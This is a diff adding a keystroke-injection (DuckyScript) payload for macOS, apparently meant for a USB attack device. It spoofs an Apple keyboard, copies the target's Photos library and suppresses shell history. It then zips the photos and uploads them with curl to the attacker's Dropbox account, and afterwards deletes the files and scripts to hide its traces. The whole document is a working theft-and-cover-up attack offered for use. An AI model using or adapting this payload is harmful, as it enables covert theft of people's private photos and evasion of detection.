@@ -1,0 +1,95 @@
+REM This Script will copy the Photos library folder and send them to your dropbox API
+REM Replace '<SYSTEM USERNAME HERE>' with the systems actual username 
+REM Replace '<YOUR API KEY HERE>' with your actual Dropbox API key 
+
+
+REM Here's the breakdown, we navigate to the finder 
+REM use the Shift GUI G to open up the "go to folder" menu.
+REM Then we search for & open the photos folder. 
+REM Now we can type "li" to navigate to the library folder that contains the photos
+REM we copy it and navigate to a new window to paste the folder
+REM Then we zip the folder and rename it "Targets_photos" and send it to the dropbox 
+REM Using the nohup and & to make sure the code is executed 
+
+REM Requirements Must have at least two windows open
+REM Dropbox API key and targets system username
+
+
+REM Author: Narsty
+REM Title: iCloud Photos to Dropbox
+REM Version 1.0 MacOs
+REM Category: Execution 
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Finder
+DELAY 1000
+ENTER
+DELAY 2000
+GUI-SHIFT g
+DELAY 1000
+STRING /Users/<SYSTEM USERNAME HERE>/Library/photos
+DELAY 500
+ENTER
+DELAY 1000
+STRING li
+DELAY 500
+GUI c
+DELAY 500
+CTRL RIGHTARROW
+DELAY 1000
+GUI v
+DELAY 15000 
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+CTRL c
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500 
+ENTER 
+DELAY 1000
+STRING  echo 'cd ~/Desktop && zip -r targets_photos.zip Libraries && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <YOUR API KEY HERE>" -H "Dropbox-API-Arg: {\"path\": \"/targets_photos.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @targets_photos.zip' > upload.sh
+DELAY 1000
+ENTER
+DELAY 2000
+STRING  chmod +x upload.sh
+DELAY 500
+ENTER
+DELAY 500
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
+DELAY 500 
+ENTER
+DELAY 7000
+CTRL C
+DELAY 500
+STRING  rm -r ~/Desktop/libraries 
+DELAY 1000 
+ENTER
+DELAY 500
+STRING  rm upload.sh
+DELAY 500
+ENTER
+DELAY 5000
+STRING  rm -r ~/Desktop/targets_photos.zip
+ENTER
+DELAY 500
+STRING  CLEAR
+DELAY 500
+ENTER
+DELAY 500
+GUI w
+DELAY 500
+ENTER
